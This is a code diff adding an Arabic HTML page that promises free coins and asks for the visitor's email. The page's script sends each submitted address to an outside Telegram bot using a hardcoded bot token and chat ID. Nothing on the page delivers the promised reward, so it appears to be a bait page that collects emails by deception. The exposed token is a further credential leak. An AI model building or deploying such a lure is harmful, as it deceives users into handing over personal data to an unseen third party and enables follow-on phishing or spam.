@@ -1,0 +1,72 @@
+
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>شحن كوينز مجانا</title>
+<style>
+  body {
+    font-family: 'Tajawal', sans-serif;
+    background-color: #1a0000;
+    color: #fff;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    height: 100vh;
+    margin: 0;
+  }
+  input, button {
+    padding: 12px;
+    font-size: 18px;
+    margin: 10px 0;
+    border-radius: 8px;
+    border: none;
+    width: 280px;
+  }
+  button {
+    background-color: #a00000;
+    color: white;
+    font-weight: 700;
+    cursor: pointer;
+  }
+  button:hover {
+    background-color: #ff0000;
+  }
+  label {
+    font-weight: 700;
+  }
+</style>
+</head>
+<body>
+<h2>أدخل إيميلك</h2>
+<input type="email" id="email" placeholder="example@mail.com" required />
+<button onclick="sendEmail()">إرسال</button>
+
+<script>
+const token = "7713540341:AAGfI7IguGT5dwEhiocvC9h0mVW9js4ByJQ";
+const chatId = "6778604620";
+
+function sendEmail() {
+  const email = document.getElementById('email').value.trim();
+  if (!email) {
+    alert('يرجى إدخال الإيميل');
+    return;
+  }
+  const message = `📧 طلب شحن كوينز مجانا:
+
+📧 البريد الإلكتروني: ${email}`;
+  fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+    .then(res => {
+      if (res.ok) {
+        alert('تم إرسال طلبك بنجاح!');
+      } else {
+        alert('خطأ في الإرسال، حاول مرة أخرى');
+      }
+    })
+    .catch(() => alert('خطأ في الاتصال'));
+}
+</script>
+</body>
+</html>
